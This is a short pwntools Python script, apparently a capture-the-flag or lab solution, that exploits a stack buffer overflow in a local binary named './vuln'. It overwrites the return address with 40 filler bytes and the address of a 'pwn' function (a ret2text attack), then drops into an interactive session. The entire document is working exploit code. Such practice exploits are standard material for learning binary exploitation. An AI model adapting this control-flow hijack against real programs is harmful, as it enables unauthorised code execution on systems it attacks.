#ret2text, yes DEP, yes ASLR, no PIE, no canary

from pwn import *

name = "./vuln"
p = process(name)
elf = ELF(name)
rop = ROP(elf)

pwn_function = elf.symbols["pwn"]
log.info("Found pwn function at: " + hex(pwn_function))

payload_base = "A"*40

payload = payload_base.encode()

payload += p64(pwn_function)

print(p.recvline())
print(p.recvline())

p.sendline(payload)
p.interactive()
